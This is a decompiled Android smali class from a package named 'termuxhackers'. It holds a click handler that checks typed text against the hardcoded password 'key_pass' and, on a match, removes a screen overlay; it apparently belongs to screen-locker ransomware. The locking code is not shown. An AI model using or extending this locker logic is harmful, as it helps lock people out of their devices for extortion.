.class Lcom/termuxhackers/id/MyService$100000000;
.super Ljava/lang/Object;
.source "MyService.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/termuxhackers/id/MyService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/termuxhackers/id/MyService;


# direct methods
.method constructor <init>(Lcom/termuxhackers/id/MyService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    return-void
.end method

.method static access$0(Lcom/termuxhackers/id/MyService$100000000;)Lcom/termuxhackers/id/MyService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .prologue
    .line 30
    move-object v0, p0

    move-object v1, p1

    move-object v6, v0

    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->e1:Landroid/widget/EditText;

    invoke-virtual {v6}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v6

    invoke-interface {v6}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, "key_pass"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 31
    move-object v6, v0

    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->windowManager:Landroid/view/WindowManager;

    move-object v7, v0

    iget-object v7, v7, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v7, v7, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;

    invoke-interface {v6, v7}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 32
    new-instance v6, Landroid/content/Intent;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    iget-object v8, v8, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v8, v8, Lcom/termuxhackers/id/MyService;->context:Landroid/content/Context;

    :try_start_0
    const-string v9, "com.termuxhackers.id.MyService"

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v3, v6

    .line 33
    move-object v6, v0

    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->context:Landroid/content/Context;

    move-object v7, v3

    invoke-virtual {v6, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v6

    .line 36
    :goto_0
    return-void

    .line 32
    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6

    .line 36
    :cond_0
    move-object v6, v0

    iget-object v6, v6, Lcom/termuxhackers/id/MyService$100000000;->this$0:Lcom/termuxhackers/id/MyService;

    iget-object v6, v6, Lcom/termuxhackers/id/MyService;->e1:Landroid/widget/EditText;

    const-string v7, ""

    invoke-virtual {v6, v7}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0
.end method
